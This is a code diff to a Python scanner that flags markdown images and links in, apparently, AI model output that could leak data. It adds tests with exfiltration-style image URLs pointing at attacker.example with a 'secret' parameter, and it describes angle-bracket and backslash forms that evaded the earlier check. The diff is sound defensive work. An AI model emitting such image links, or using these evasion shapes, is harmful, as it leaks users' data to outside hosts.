@@ -2744,6 +2744,31 @@ def test_protocol_relative_image_is_flagged(url):
     assert [f.entity for f in findings] == ["EXTERNAL_IMAGE"]
 
 
+@pytest.mark.parametrize(
+    "destination",
+    [
+        "<https://attacker.example/log?d=secret>",
+        "< https://attacker.example/log >",
+        "https:\\\\attacker.example\\log",
+        "\\\\attacker.example\\log",
+    ],
+    ids=["angle-brackets", "angle-brackets-spaced", "backslash-scheme", "backslash-relative"],
+)
+def test_url_shapes_a_browser_resolves_are_not_missed(destination):
+    """CommonMark angle-bracket destinations and backslash forms both render to
+    a live <img src> in a real markdown renderer, and both previously produced
+    zero findings — the primary exfiltration path, silently open."""
+    findings = scan_exfil(f"See ![x]({destination})", allowlist=["cdn.nufi.me"])
+
+    assert [f.entity for f in findings] == ["EXTERNAL_IMAGE"]
+
+
+def test_angle_bracket_allowlisted_host_is_still_allowed():
+    findings = scan_exfil("![x](<https://cdn.nufi.me/logo.png>)", allowlist=["cdn.nufi.me"])
+
+    assert findings == []
+
+
 def test_protocol_relative_allowlisted_host_is_still_allowed():
     findings = scan_exfil("![x](//cdn.nufi.me/logo.png)", allowlist=["cdn.nufi.me"])
 
@@ -2902,6 +2927,26 @@ def scan_system_echo(output: str, system_prompt: str, n: int = 8) -> list[Findin
     ]
 
 
+def _normalise_url(url: str) -> str:
+    """Reduce a markdown destination to what a browser would actually fetch.
+
+    Normalisation happens ONCE, here, before any gate inspects the URL. The
+    previous shape normalised backslashes inside `_host_allowed` but not in
+    `_is_external`, so `https:\\attacker.example\log` was rejected as
+    "not external" before the host was ever examined — the same parser
+    differential, one gate earlier. A single choke point is what stops that
+    class from reappearing at the next gate someone adds.
+
+    Handles: CommonMark angle-bracket destinations `<url>`, which are standard
+    markdown and render to a live <img src>; and backslashes, which WHATWG URL
+    parsing treats as separators while Python's urlparse does not.
+    """
+    cleaned = url.strip()
+    if cleaned.startswith("<") and cleaned.endswith(">"):
+        cleaned = cleaned[1:-1].strip()
+    return cleaned.replace("\\", "/")
+
+
 def _is_external(url: str) -> bool:
     """Does this URL leave the page's own origin?
 
@@ -2938,12 +2983,12 @@ def scan_exfil(output: str, allowlist: list[str]) -> list[Finding]:
         )
 
     for match in _MD_IMAGE.finditer(output):
-        url = match.group("url")
+        url = _normalise_url(match.group("url"))
         if _is_external(url) and not _host_allowed(url, allowlist):
             add("EXTERNAL_IMAGE", match.start(), match.end())
 
     for match in _MD_LINK.finditer(output):
-        if match.group("url").lower().startswith("javascript:"):
+        if _normalise_url(match.group("url")).lower().startswith("javascript:"):
             add("JAVASCRIPT_URL", match.start(), match.end())
 
     for match in _RAW_HTML.finditer(output):
